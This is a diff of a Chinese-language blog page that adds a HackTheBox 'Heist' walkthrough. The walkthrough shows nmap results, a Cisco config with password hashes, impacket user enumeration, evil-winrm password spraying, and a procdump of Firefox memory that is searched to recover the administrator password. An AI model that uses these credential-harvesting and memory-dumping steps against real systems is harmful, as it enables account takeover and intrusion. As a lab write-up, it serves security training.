@@ -131,16 +131,24 @@
 
 
 
+<meta name="description" content="不同用户名可能对应相同的密码">
 <meta name="keywords" content="hackthebox">
 <meta property="og:type" content="article">
 <meta property="og:title" content="hackthebox-Heist">
 <meta property="og:url" content="http://zanderchang.github.io/2019/11/03/hackthebox-Heist/index.html">
 <meta property="og:site_name" content="我的博客">
+<meta property="og:description" content="不同用户名可能对应相同的密码">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://zanderchang.github.io/img/heist/1.png">
-<meta property="og:updated_time" content="2019-11-03T12:21:41.501Z">
+<meta property="og:image" content="http://zanderchang.github.io/img/heist/2.png">
+<meta property="og:image" content="http://zanderchang.github.io/img/heist/3.png">
+<meta property="og:image" content="http://zanderchang.github.io/img/heist/4.png">
+<meta property="og:image" content="http://zanderchang.github.io/img/heist/5.png">
+<meta property="og:image" content="http://zanderchang.github.io/img/heist/6.png">
+<meta property="og:updated_time" content="2019-12-02T13:09:17.014Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="hackthebox-Heist">
+<meta name="twitter:description" content="不同用户名可能对应相同的密码">
 <meta name="twitter:image" content="http://zanderchang.github.io/img/heist/1.png">
 
 
@@ -381,8 +389,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-11-03T20:21:41+08:00">
-                2019-11-03 20:21:41
+              <time title="更新于" itemprop="dateModified" datetime="2019-12-02T21:09:17+08:00">
+                2019-12-02 21:09:17
               </time>
             
           </span>
@@ -449,7 +457,48 @@
 
       
         <p><img src="/img/heist/1.png" alt></p>
+<p>不同用户名可能对应相同的密码</p>
 <a id="more"></a>
+<ul>
+<li><code>nmap</code>扫描，<code>-p1-65535</code>，得到端口<code>80</code>、<code>135</code>、<code>445</code>、<code>5985</code>、<code>49668</code></li>
+</ul>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">80/tcp  open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag <span class="keyword">not</span> set</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-title: Support Login Page</span><br><span class="line">|_Requested<span class="built_in"> resource </span>was login.php</span><br><span class="line">135/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">445/tcp open  microsoft-ds?</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">49668/tcp open  unknown</span><br></pre></td></tr></table></figure>
+<ul>
+<li>查看<code>http://10.10.10.149</code>，在<code>Login as guest</code>中下载<code>Attachment</code>的<code>config.txt</code></li>
+</ul>
+<p><img src="/img/heist/2.png" alt></p>
+<p><img src="/img/heist/3.png" alt></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">version 12.2</span><br><span class="line"><span class="literal">no</span><span class="built_in"> service </span>pad</span><br><span class="line">service password-encryption</span><br><span class="line">!</span><br><span class="line">isdn switch-type basic-5ess</span><br><span class="line">!</span><br><span class="line">hostname ios-1</span><br><span class="line">!</span><br><span class="line">security passwords min-length 12</span><br><span class="line"><span class="builtin-name">enable</span><span class="built_in"> secret </span>5 <span class="variable">$1</span><span class="variable">$pdQG</span><span class="variable">$o8nrSzsGXeaduXrjlvKc91</span></span><br><span class="line">!</span><br><span class="line">username rout3r password 7 0242114B0E143F015F5D1E161713</span><br><span class="line">username admin privilege 15 password 7 02375012182C1A1D751618034F36415408</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">ip ssh authentication-retries 5</span><br><span class="line">ip ssh version 2</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">router<span class="built_in"> bgp </span>100</span><br><span class="line"> synchronization</span><br><span class="line"><span class="built_in"> bgp </span>log-neighbor-changes</span><br><span class="line"><span class="built_in"> bgp </span>dampening</span><br><span class="line"><span class="built_in"> network </span>192.168.0.0 mask 300.255.255.0</span><br><span class="line"> timers<span class="built_in"> bgp </span>3 9</span><br><span class="line"> redistribute connected</span><br><span class="line">!</span><br><span class="line">ip classless</span><br><span class="line">ip<span class="built_in"> route </span>0.0.0.0 0.0.0.0 192.168.0.1</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">access-list 101 permit<span class="built_in"> ip </span>any any</span><br><span class="line">dialer-list 1 protocol<span class="built_in"> ip </span>list 101</span><br><span class="line">!</span><br><span class="line"><span class="literal">no</span><span class="built_in"> ip </span>http server</span><br><span class="line"><span class="literal">no</span><span class="built_in"> ip </span>http secure-server</span><br><span class="line">!</span><br><span class="line">line vty 0 4</span><br><span class="line"> session-timeout 600</span><br><span class="line"> authorization exec SSH</span><br><span class="line"> transport input ssh</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p><code>config.txt</code>中提到Cisco的3个密码，2个为<code>type7</code>可直接解密，1个为<code>type5</code>使用<code>hashcat</code>解密；同时搜集到三个用户名<code>rout3r</code>、<code>admin</code>、<code>Hazard</code>，推测<code>Hazard</code>和<code>type5</code>的密码<code>stealth1agent</code>有关</p>
+</li>
+<li><p>使用<a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener"><code>impacket</code></a>的<code>lookupsid.py</code>搜索其它用户名，发现<code>support</code>、<code>Chase</code>和<code>Jason</code></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./lookupsid.py Hazard:stealth1agent@10.10.10.149</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用<code>evil-winrm</code>，用上述发现的用户名和密码组成的字典进行爆破，获得<code>Chase</code>的密码</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby evil-winrm.rb -i 10.10.10.149 -u Chase -p <span class="string">'Q4)sJu\Y8qz*A3?d'</span></span><br></pre></td></tr></table></figure>
+<p>获得<code>user.txt</code></p>
+</li>
+</ul>
+<p><img src="/img/heist/4.png" alt></p>
+<ul>
+<li><p>查看<code>Users</code>目录发现主机用户有<code>Administrator</code>、<code>Chase</code>和<code>Hazard</code></p>
+</li>
+<li><p>枚举进程，发现<code>firefox</code></p>
+</li>
+</ul>
+<p><img src="/img/heist/5.png" alt></p>
+<ul>
+<li><p>在<code>evil-winrm</code>中<code>upload</code>工具<code>procdump64.exe</code>，将<code>firefox</code>的进程内存dump下来</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./Procdump64.exe -accepteula -ma 6276 firefox-6276.dmp</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>搜索内存得到新密码</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select-string firefox-6276.dmp -pattern <span class="string">"password"</span></span><br><span class="line">// login_username=admin@support.htb&amp;login_password=4dD!5&#125;x/re8]FBuZ&amp;login=</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用<code>evil-winrm</code>以<code>Administrator</code>和新密码登录，获得<code>root.txt</code></p>
+</li>
+</ul>
+<p><img src="/img/heist/6.png" alt></p>
 
       
     </div>
